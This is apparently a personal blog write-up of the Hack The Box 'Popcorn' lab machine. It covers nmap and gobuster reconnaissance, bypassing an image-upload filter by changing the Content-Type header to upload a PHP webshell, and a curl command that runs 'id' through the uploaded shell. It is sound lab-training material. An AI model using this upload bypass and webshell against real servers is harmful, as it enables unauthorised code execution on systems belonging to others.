---
title: htb popcorn
author: Yuchao
date: 2021-03-15 11:33:00 +0800
categories: [sec]
tags: [htb]
math: true
mermaid: true
---

## Recon

#### nmap 
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.6
nmap -p 22,80 -sC -sV -oA scans/tcpscripts 10.10.10.6
```
- OpenSSH 5.1p1, Apache httpd 2.2.12  ---> older than Ubuntu Trusty 14.04 ---> Karmic (9.10)

#### Directory discovery
```bash
# asdf
gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster-root-med -t 40
```
- get the path: /test (Status: 200) /index (Status: 200) /torrent (Status: 301) /rename (Status: 301)
- show a PHP info page.
- ``` file_uploads ``` is set to ON
- may vulnerable to Local File Inclusion.(LFI)
- /torrent can upload image as screen shot
- and the picture is saved at ``` http://10.10.10.6/torrent/upload/ ```

## upload webshell
#### manipulate php to bypass picture filters
- 1. file extension (the server did not have check this)
- 2. Content-Type header (this filter works on the server)
- 3. magic bytes (did not work)

so just change the http header

#### upload
cmd.php seems to be rename as its hash value, as 0ba973670d943861fb9453eecefd3bf7d3054713.php.

#### execute
``` curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php?cmd=id ```

